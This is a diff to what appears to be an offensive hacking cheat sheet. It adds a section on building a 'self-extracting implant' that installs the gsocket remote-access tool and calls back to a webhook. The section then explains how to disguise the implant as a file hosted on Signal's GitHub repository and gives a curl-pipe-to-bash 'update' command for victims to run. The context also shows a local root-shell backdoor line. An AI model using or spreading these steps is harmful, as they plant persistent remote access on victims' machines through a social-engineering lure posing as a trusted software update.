@@ -75,6 +75,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#carriage-return-backdoor) 
    1. [Local Root backdoor](#ld-backdoor)
+   1. [Self-extracting implant](#implant)
 1. [Host Recon](#hostrecon)
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
@@ -1603,6 +1604,33 @@ Become root
 ```bash
 ### Execute as non-root user
 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+```
+
+<a id="implant"></a>
+**6.vi. Self-Extracting implant**
+
+Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).
+
+Simple example:
+```sh
+# Create implant 'egg.sh' containing the file 'foo'
+# and the directory 'warez'. When executing 'egg.sh' then
+# extract 'foo' and 'warez' and call 'warez/run/sh'
+./mkegg.sh egg.sh foo warez warez/run.sh
+```
+
+Real world examples are best:
+1. Create an implant that installs gsocket and calls our webhook on success:
+```sh
+./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 deploy-all.sh 2>/dev/null >/dev/null &)'
+# On the target system do: 'cat egg.sh | bash' or './egg.sh'
+```
+
+2. Rename `egg.sh` to `update-for-fools.txt` and upload as blob to [Signal's](https://www.signal.org/) GitHub repository.
+
+3. Don't fool people to update Signal using this command ❤️:
+```sh
+curl -fL https://github.com/signalapp/Signal-Desktop/files/15037868/update-for-fools.txt | bash
 ```
 
 <a id="hostrecon"></a>
